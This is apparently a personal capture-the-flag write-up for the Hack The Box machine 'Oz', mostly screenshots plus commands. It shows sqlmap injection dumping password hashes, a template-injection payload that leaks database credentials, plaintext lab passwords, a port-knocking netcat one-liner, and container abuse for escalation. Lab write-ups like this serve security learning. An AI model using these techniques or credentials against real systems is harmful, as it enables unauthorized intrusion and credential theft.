# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/T13BPi0.png)
###### PORT `80`
![](https://i.imgur.com/mWSFWrX.png)
![](https://i.imgur.com/G1JAqNN.png)
- When i Open that, it is some thinh like username checker.
	- ![](https://i.imgur.com/wV52A5I.png)
	- ![](https://i.imgur.com/XHHSY2j.png)
	- ![](https://i.imgur.com/FqfDIrx.png)
- This means, there will be some kinds database, so i can try sqli
	- ` sqlmap -u "http://oz.htb/users/*"`
	- ![](https://i.imgur.com/gMjxDgd.png)
```shell
+----+----------------------------------------------------------------------------------------+-------------+
| id | password                                                                               | username    |
+----+----------------------------------------------------------------------------------------+-------------+
| 1  | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 | dorthi      |
| 2  | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk | tin.man     |
| 3  | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY | wizard.oz   |
| 4  | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY | coward.lyon |
| 5  | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg | toto        |
| 6  | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ | admin       |
+----+----------------------------------------------------------------------------------------+-------------+

+----+--------------------------------------------------------------------------------------------------------------------------------+----------+
| id | desc                                                                                                                           | name     |
+----+--------------------------------------------------------------------------------------------------------------------------------+----------+
| 1  | Reissued new id_rsa and id_rsa.pub keys for ssh access to dorthi.                                                              | GBR-987  |
| 2  | Where did all these damn monkey's come from!?  I need to call pest control.                                                    | GBR-1204 |
| 3  | Note to self: Toto keeps chewing on the curtain, find one with dog repellent.                                                  | GBR-1205 |
| 4  | Nothing to see here... V2hhdCBkaWQgeW91IGV4cGVjdD8=                                                                            | GBR-1389 |
| 5  | Think of a better secret knock for the front door.  Doesn't seem that secure, a Lion got in today.                             | GBR-4034 |
| 6  | I bet you won't read the next entry.                                                                                           | GBR-5012 |
| 7  | HAHA! Made you look.                                                                                                           | GBR-7890 |
| 8  | Dorthi should be able to find her keys in the default folder under /home/dorthi/ on the db.                                    | GBR-7945 |
| 9  | Seriously though, WW91J3JlIGp1c3QgdHJ5aW5nIHRvbyBoYXJkLi4uIG5vYm9keSBoaWRlcyBhbnl0aGluZyBpbiBiYXNlNjQgYW55bW9yZS4uLiBjJ21vbi4= | GBR-8011 |
| 10 | You are just wasting time now... someone else is getting user.txt                                                              | GBR-8042 |
| 11 | Look... now they've got root.txt and you don't even have user.txt                                                              | GBR-8457 |
| 12 | db information loaded to ticket application for shared db access                                                               | GBR-9872 |
+----+--------------------------------------------------------------------------------------------------------------------------------+----------+
```

- ![](https://i.imgur.com/nDM6AQr.png)
` wizard.oz : wizardofoz22 ` ${{<%[%'"}}%\ 
![](https://i.imgur.com/c6baHGV.png)
- Nothing here so i tried to dread files using the sqli
	- ![](https://i.imgur.com/0ZZm0ar.png)
![](https://i.imgur.com/7EZoTVR.png)
- I coudnt get more paths, so i went back to the page and tried to create ticket.
![](https://i.imgur.com/88PnIoH.png)
`{{config.items()}}`
	`dorthi:N0Pl4c3L1keH0me - mysql+pymysql://dorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb
`
### Gaining Access
![](https://i.imgur.com/UruPcfO.png)
![](https://i.imgur.com/FUd4LXY.png)
## Internal
### Enumeration
```
/app/ticketer # cat /.secret/knockd.conf
[options]
	logfile = /var/log/knockd.log

[opencloseSSH]

	sequence	= 40809:udp,50212:udp,46969:udp
	seq_timeout	= 15
	start_command	= ufw allow from %IP% to any port 22
	cmd_timeout	= 10
	stop_command	= ufw delete allow from %IP% to any port 22
	tcpflags	= syn
```
- The Knockd configuration is used to configure the Knockd service, which is a utility that allows you to open a port on a firewall (in this case, ufw) by sending a specific sequence of UDP packets to a specific port.
### Gaining Access
```shell
┌──(rexder㉿HunterMachine)-[~]
└─$ ports="40809 50212 46969"; for port in $ports; do echo "a" | nc -u -w 1 10.10.10.96 ${port}; sleep 0.5; done; echo "knock done"; nc -w 1 -nvv 10.10.10.96 22
knock done
(UNKNOWN) [10.10.10.96] 22 (ssh) open
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
```
```shell
rexder@HunterMachine ~ [1]> nc -nvu 10.10.10.96 40809
(UNKNOWN) [10.10.10.96] 40809 (?) open
^C
rexder@HunterMachine ~ [1]> nc -nvu 10.10.10.96 50212
(UNKNOWN) [10.10.10.96] 50212 (?) open
^C
rexder@HunterMachine ~ [1]> nc -nvu 10.10.10.96 46969
(UNKNOWN) [10.10.10.96] 46969 (?) open
^C

rexder@HunterMachine ~/C/H/M/oz> ssh dorthi@oz.htb -i id_rsa.pem
dorthi@oz:~$ ls
user.txt
dorthi@oz:~$ cat user.txt
```
### Maintaining Access
![](https://i.imgur.com/kpaKFFa.png)
![](https://i.imgur.com/OcAzOh1.png)
- `MYSQL_ROOT_PASSWORD=SuP3rS3cr3tP@ss`
![](https://i.imgur.com/CxL9S1V.png)
https://github.com/portainer/portainer/issues/493
![](https://i.imgur.com/2Ctx79R.png)
- Created a new Container
![](https://i.imgur.com/Qy50MH0.png)
- I made it to sh because as docker their is no bash installed
![](https://i.imgur.com/uh8eQYQ.png)

# Random Notes